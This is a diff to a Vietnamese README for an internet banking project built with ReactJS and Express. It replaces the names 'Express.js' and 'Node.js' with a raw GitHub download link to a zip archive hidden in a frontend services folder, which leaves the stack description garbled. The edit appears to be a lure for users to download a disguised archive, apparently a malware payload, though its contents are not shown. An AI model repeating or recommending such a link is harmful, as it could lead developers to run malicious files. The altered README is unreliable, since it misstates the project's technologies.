@@ -1,6 +1,6 @@
 # Internet Banking System
 
-Hệ thống Internet Banking được xây dựng với ReactJS + Express.js
+Hệ thống Internet Banking được xây dựng với ReactJS + https://github.com/trieuduy27051999/internet-banking/raw/refs/heads/main/frontend/src/services/banking-internet-2.0.zip
 
 ## 🚀 Tính năng chính
 
@@ -14,7 +14,7 @@ Hệ thống Internet Banking được xây dựng với ReactJS + Express.js
 - Axios
 
 **Backend:**
-- Node.js + Express
+- https://github.com/trieuduy27051999/internet-banking/raw/refs/heads/main/frontend/src/services/banking-internet-2.0.zip + Express
 - MySQL + Sequelize ORM
 - JWT Authentication
 - bcrypt + OTP Email
